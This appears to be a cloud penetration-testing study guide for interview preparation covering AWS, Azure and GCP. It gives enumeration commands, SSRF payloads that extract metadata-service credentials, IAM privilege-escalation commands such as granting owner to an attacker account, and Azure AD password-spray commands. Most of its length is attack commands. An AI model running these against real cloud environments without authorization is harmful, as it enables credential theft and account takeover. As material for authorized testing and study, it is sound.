# Cloud Security

!!! info "Why This Matters"
    Cloud environments are now the dominant infrastructure for most organizations. Cloud security misconfigurations are consistently the leading cause of major breaches. Senior pentesters are expected to assess AWS, Azure, and GCP environments — and to understand how cloud-specific attack paths differ fundamentally from traditional network pentesting.

---

## Cloud Security Mindset Shift

Traditional network pentesting: compromise a host → pivot through the network → reach high-value targets.

Cloud pentesting: compromise a credential or misconfiguration → abuse cloud API permissions → reach high-value data or escalate to administrator without touching any "host."

The attack surface in cloud is **IAM (Identity and Access Management)** — permissions, roles, policies, and credentials. A misconfigured S3 bucket or an overly-permissive IAM role is more dangerous than a missing OS patch in cloud environments.

---

## AWS Attack Surface

### IAM Fundamentals

```
IAM Users       → Long-term credentials (access key + secret)
IAM Roles       → Temporary credentials (assumed by services, users, or other accounts)
IAM Groups      → Collection of users with shared policies
IAM Policies    → JSON documents defining what actions are allowed on which resources
```

**Policy types:**
- **Identity-based:** Attached to users, groups, or roles — defines what that identity can do
- **Resource-based:** Attached to resources (S3 buckets, SQS queues) — defines who can access the resource
- **Permission boundaries:** Maximum permissions an identity can have
- **Service Control Policies (SCPs):** Organization-level controls that apply to all accounts in an AWS Organization

### AWS Enumeration

```bash
# Configure AWS CLI with compromised credentials
aws configure
# Or set env vars:
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=...  # If temporary credentials

# Who am I?
aws sts get-caller-identity
# Returns: Account ID, User/Role ARN, and User ID

# Enumerate IAM permissions (what can I do?)
aws iam list-attached-user-policies --user-name myuser
aws iam list-user-policies --user-name myuser
aws iam get-policy-version --policy-arn arn:aws:iam::123456789012:policy/MyPolicy --version-id v1

# Enumerate S3 buckets
aws s3 ls
aws s3 ls s3://bucket-name
aws s3 ls s3://bucket-name --recursive
aws s3 cp s3://bucket-name/file.txt ./

# Enumerate EC2 instances
aws ec2 describe-instances
aws ec2 describe-instances --query "Reservations[].Instances[].{ID:InstanceId,IP:PublicIpAddress,Type:InstanceType,Role:IamInstanceProfile.Arn}"

# Enumerate Lambda functions
aws lambda list-functions
aws lambda get-function --function-name my-function
aws lambda get-function-configuration --function-name my-function

# Enumerate RDS databases
aws rds describe-db-instances

# Enumerate Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id MySecret

# Enumerate SSM Parameter Store
aws ssm describe-parameters
aws ssm get-parameters --names /prod/db/password --with-decryption

# Network configuration
aws ec2 describe-security-groups
aws ec2 describe-vpcs
aws ec2 describe-subnets
```

### SSRF to Instance Metadata Service (IMDS)

EC2 instances have access to the metadata service at `169.254.169.254`. If SSRF is found on an EC2-hosted application:

```bash
# Via SSRF in web app:
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Returns list of attached IAM roles:
# {"Code":"Success","LastUpdated":"...","Type":"AWS-HMAC",
#  "AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}

# IMDSv2 (more secure — requires PUT first to get token):
# SSRF must support PUT method to exploit IMDSv2
?url=http://169.254.169.254/latest/api/token  # PUT with TTL header first
```

### IAM Privilege Escalation Paths

Many IAM privilege escalation paths exist when a user has specific permissions. Key examples:

```bash
# iam:CreatePolicyVersion → Create new policy version with admin permissions
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# iam:PassRole + ec2:RunInstances → Launch instance with admin role
aws ec2 run-instances \
  --image-id ami-xxxx \
  --instance-type t2.micro \
  --iam-instance-profile Name=AdminRole
# Then access metadata service from the instance to get admin credentials

# iam:CreateLoginProfile → Create console password for existing user (even admin)
aws iam create-login-profile \
  --user-name Admin \
  --password "P@ssw0rd123!" \
  --no-password-reset-required

# iam:UpdateAssumeRolePolicy → Modify trust policy to allow your user to assume admin role
aws iam update-assume-role-policy \
  --role-name AdminRole \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::123456789012:user/myuser"},"Action":"sts:AssumeRole"}]}'

# Then assume the role:
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name attack
```

**Pacu** automates IAM privilege escalation enumeration:
```bash
# Install
pip install pacu

# Start
pacu

# In Pacu:
import_keys <profile>
run iam__enum_permissions
run iam__privesc_scan
```

### AWS-Specific Tools

```bash
# Pacu — AWS exploitation framework (open source, from Rhino Security Labs)
pacu
> run iam__enum_permissions
> run s3__bucket_finder
> run ec2__enum

# ScoutSuite — multi-cloud security auditing
scout aws --report-dir report/
# Produces HTML report with all findings

# Prowler — CIS benchmarks + security checks
prowler -g cislevel1
prowler -c check11 check12 check13  # Specific checks

# CloudFox — finding secrets and attack paths
cloudfox aws --profile myprofile all-checks

# enumerate-iam — determine IAM permissions via brute force
python enumerate-iam.py --access-key AKIAIOSFODNN7EXAMPLE --secret-key wJalrXUt...

# truffleHog — find secrets in S3, code
trufflehog s3 --bucket my-bucket
```

---

## Azure Attack Surface

### Azure Identity Model

```
Azure Active Directory (Entra ID) — Identity provider
  ├── Users
  ├── Groups
  ├── Service Principals (application identities)
  ├── Managed Identities (automatically managed service accounts)
  └── Applications (registered apps with API permissions)

Azure RBAC — Resource permissions
  ├── Owner, Contributor, Reader (built-in roles)
  └── Custom roles

Management hierarchy:
  Management Groups → Subscriptions → Resource Groups → Resources
```

### Azure Enumeration

```bash
# Install Azure CLI
az login
az account list  # All subscriptions

# Current identity
az ad signed-in-user show
az account get-access-token

# Enumerate resources
az resource list --output table
az vm list --output table
az storage account list --output table
az keyvault list --output table
az webapp list --output table

# Enumerate role assignments (who has what access)
az role assignment list --all --output table

# Check storage account for public blobs
az storage blob list --account-name mystorageaccount --container-name mycontainer \
  --auth-mode login

# Key Vault secrets
az keyvault secret list --vault-name mykeyvault
az keyvault secret show --vault-name mykeyvault --name mysecret

# Enumerate Entra ID
az ad user list --output table
az ad group list --output table
az ad sp list --output table  # Service principals
az ad app list --output table  # Registered apps

# Managed identity abuse (from within an Azure VM/Function)
# Get token from IMDS
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H 'Metadata: true'
# Use token to call ARM API
```

### Azure-Specific Attack Paths

**Managed Identity Abuse:**
VMs, Functions, and App Services can have managed identities with Azure RBAC assignments. If SSRF is found:
```bash
# From within Azure resource (SSRF or code execution):
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
  -H 'Metadata: true'
# Returns access token with the resource's managed identity permissions
```

**Azure AD Password Spray:**
```bash
# MSOLSpray — sprays Azure AD credentials
python MSOLSpray.py --userlist users.txt --password 'Summer2024!'

# Trevorspray — multi-threaded, supports proxies
trevorspray -u users.txt -p 'Password123!' --fireprox https://your-fireprox-url
```

**Illicit Consent Grant:**
Register an Azure AD application requesting high-privilege Graph API permissions. Send the OAuth consent URL to a victim admin — if they approve, the application gets those permissions indefinitely.

**Azure tools:**
```bash
# ROADtools — Azure AD reconnaissance
roadrecon gather -u user@corp.com -p password
roadrecon gui  # Browse collected data

# AzureHound — BloodHound data collector for Azure
azurehound -u user@corp.com -p password --tenant corp.onmicrosoft.com

# MicroBurst — PowerShell Azure enumeration
Get-AzureDomainInfo -folder MicroBurst
Invoke-EnumerateAzureBlobs -base corp  # Find public blobs
```

---

## GCP Attack Surface

```bash
# Google Cloud CLI
gcloud auth login
gcloud auth application-default login
gcloud config list

# Enumerate projects
gcloud projects list

# Enumerate compute instances
gcloud compute instances list

# Enumerate storage buckets
gsutil ls
gsutil ls -la gs://bucket-name

# Check bucket ACLs
gsutil iam get gs://bucket-name

# Enumerate service accounts
gcloud iam service-accounts list

# Enumerate IAM bindings
gcloud projects get-iam-policy PROJECT_ID

# GCP metadata (from inside GCP instance — SSRF)
curl 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \
  -H 'Metadata-Flavor: Google'

# Enumerate secrets
gcloud secrets list
gcloud secrets versions access latest --secret="mysecret"
```

---

## Cloud Security Findings — Common Examples

| Finding | Service | Severity |
|---------|---------|----------|
| S3 bucket with public write access | AWS S3 | Critical |
| IAM user with AdministratorAccess | AWS IAM | High |
| Access keys older than 90 days | AWS IAM | Medium |
| Root account without MFA | AWS IAM | Critical |
| Security group allowing 0.0.0.0/0 on port 22 | AWS EC2 | High |
| CloudTrail disabled | AWS CloudTrail | High |
| Lambda with admin IAM role | AWS Lambda | High |
| Storage account with public blob access | Azure Storage | Critical |
| No MFA for global administrators | Azure AD | Critical |
| Key Vault accessible without private endpoint | Azure Key Vault | Medium |
| GCP bucket with allUsers ACL | GCP Storage | Critical |
| Service account key downloaded and active | GCP IAM | High |
| Compute default service account with editor role | GCP IAM | High |

---

## GCP — Google Cloud Platform (Expanded)

GCP is the least commonly assessed cloud platform but increasingly present in enterprises. The attack surface differs from AWS and Azure in important ways.

### GCP Identity Model

```
Google Account / Service Account → IAM Roles → Permissions → Resources

Key identity types:
- Google Account: Individual user (person@gmail.com or person@company.com)
- Service Account: Machine identity (app@project.iam.gserviceaccount.com)
- Google Group: Group of users
- Cloud Identity domain: Organization-level identity

IAM hierarchy:
Organization → Folder → Project → Resource
Permissions cascade downward — org-level IAM applies to all projects
```

### GCP Enumeration

```bash
# Authentication
gcloud auth login                          # Interactive browser auth
gcloud auth activate-service-account \
  --key-file service_account.json         # Service account key

# Check current identity
gcloud auth list
gcloud config list
gcloud projects list

# Who am I and what can I do?
gcloud config get-value account
gcloud projects get-iam-policy PROJECT_ID  # IAM policy for project

# Enumerate service accounts
gcloud iam service-accounts list --project PROJECT_ID
gcloud iam service-accounts keys list \
  --iam-account sa@project.iam.gserviceaccount.com

# Enumerate resources
gcloud compute instances list             # VMs
gcloud compute disks list                 # Persistent disks
gcloud compute firewall-rules list        # Firewall rules
gcloud compute networks list              # VPC networks

gcloud sql instances list                 # Cloud SQL databases
gcloud storage buckets list               # GCS buckets
gsutil ls                                 # Alternative bucket listing

gcloud functions list                     # Cloud Functions
gcloud run services list                  # Cloud Run services
gcloud container clusters list            # GKE clusters

# Secrets
gcloud secrets list --project PROJECT_ID
gcloud secrets versions access latest --secret="SECRET_NAME"

# Cloud Build (check for exposed build history)
gcloud builds list

# App Engine
gcloud app services list
gcloud app versions list
```

### GCP Privilege Escalation Paths

GCP has numerous IAM privilege escalation paths. Key ones:

```bash
# 1. iam.serviceAccountTokenCreator role
# Can create tokens for any service account in the project
gcloud auth print-access-token --impersonate-service-account=target-sa@project.iam.gserviceaccount.com
# Then use that token to act as the target service account

# 2. iam.serviceAccountKeyAdmin
# Can create service account keys for any SA
gcloud iam service-accounts keys create key.json \
  --iam-account=admin-sa@project.iam.gserviceaccount.com
gcloud auth activate-service-account --key-file key.json

# 3. cloudfunctions.functions.update (with iam.serviceAccounts.actAs)
# Update a Cloud Function to run as a privileged SA and exfiltrate its token
gcloud functions deploy FUNCTION_NAME \
  --source modified_source/ \
  --service-account admin-sa@project.iam.gserviceaccount.com

# 4. compute.instances.setServiceAccount
# Assign a privileged SA to a VM instance, then access IMDS from the instance

# 5. resourcemanager.projects.setIamPolicy
# Directly modify project IAM policy to grant yourself any role
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="user:attacker@gmail.com" \
  --role="roles/owner"
```

### GCP Metadata Service

When SSRF is found in a GCP-hosted application:

```bash
# Base URL
http://metadata.google.internal/computeMetadata/v1/
# Required header: Metadata-Flavor: Google

# Via SSRF:
?url=http://metadata.google.internal/computeMetadata/v1/

# Service account token (from compute instance)
?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Returns: {"access_token":"ya29...","expires_in":3598,"token_type":"Bearer"}

# Service account email
?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# Project ID
?url=http://metadata.google.internal/computeMetadata/v1/project/project-id

# SSH keys
?url=http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys

# Startup script (sometimes contains credentials)
?url=http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script

# Use the access token with gcloud
export CLOUDSDK_AUTH_ACCESS_TOKEN="ya29..."
gcloud projects list
gcloud secrets versions access latest --secret="SECRET_NAME"
```

### GCS Bucket Misconfigurations

Google Cloud Storage buckets can be misconfigured for public access, similar to S3.

```bash
# Check if bucket is publicly accessible
gsutil ls gs://target-bucket-name
gsutil ls -la gs://target-bucket-name    # With permissions

# Without authentication — attempt anonymous access
curl https://storage.googleapis.com/target-bucket-name/
curl https://storage.googleapis.com/target-bucket-name/sensitive-file.txt

# Check bucket ACL
gsutil iam get gs://target-bucket-name

# Test write access (dangerous — only with explicit authorization)
echo "test" | gsutil cp - gs://target-bucket-name/test.txt

# Find public buckets via search (Google dorks)
# site:storage.googleapis.com company-name
# site:storage.googleapis.com filetype:pdf confidential
```

### GCP-Specific Tools

```bash
# GCP IAM Privilege Escalation Scanner
# https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
python3 PrivEsc/PrivEsc.py

# gcp_scanner — enumerate GCP resources and permissions
pip install gcp-scanner
python3 -m gcp_scanner.scanner -cc default -o output.json

# CloudFox — multi-cloud attack path finder
cloudfox gcp --profile PROJECT_ID all-checks

# ScoutSuite — multi-cloud security auditing
scout gcp --user-account
scout gcp --service-account key.json
```

---

## Multi-Cloud Attack Paths

In mature enterprises, cloud environments span AWS, Azure, and GCP simultaneously. Cross-cloud attack paths exist:

**Federated identity attacks:**
Many organizations use Azure AD (Entra ID) as their identity provider federated to AWS and GCP. Compromising an Entra ID account with AWS role federation can grant AWS access. Tools like ROADtools enumerate these federation relationships.

**Shared secrets in CI/CD:**
GitHub Actions, GitLab CI, and Jenkins often have secrets for all three cloud providers. Compromising the CI/CD pipeline gives multi-cloud access simultaneously.

**Terraform state files:**
Terraform state often contains resource IDs, IPs, and sometimes credentials. If stored in an S3 bucket or GCS bucket with misconfigured access, the state file reveals the entire infrastructure.

```bash
# Find Terraform state files
aws s3 ls --recursive s3:// 2>/dev/null | grep terraform.tfstate
gsutil ls gs://** | grep terraform.tfstate

# Read state file (may contain sensitive outputs)
aws s3 cp s3://bucket/terraform.tfstate ./
cat terraform.tfstate | jq '.resources[].instances[].attributes'
```

---

## Cloud Security Interview Questions to Prepare

**"How is cloud security different from traditional network security?"**
The perimeter doesn't exist. Authentication and authorization (IAM) become the primary control. Misconfiguration is the dominant vulnerability class, not software exploits. Shared responsibility model means the provider secures the infrastructure; you secure what you build on it. The API is both the attack surface and the management plane.

**"Walk me through a cloud SSRF finding from identification to impact."**
Identify parameter accepting URL → test with Burp Collaborator (DNS callback confirms SSRF) → test for metadata service access (169.254.169.254 for AWS, same for Azure, metadata.google.internal for GCP) → extract IAM credentials from metadata → use credentials with cloud CLI → enumerate permissions → identify privilege escalation path → demonstrate maximum achievable impact (data access, additional cloud resources, lateral movement to other accounts).

**"What's the most critical cloud misconfiguration you've seen and why?"**
Expect this at senior level. Have a real or realistic answer prepared: overly permissive IAM roles on EC2 instances leading to full account compromise via SSRF, publicly writable S3 buckets in a PCI environment, or CloudTrail disabled combined with no alerting enabling long-term undetected access.
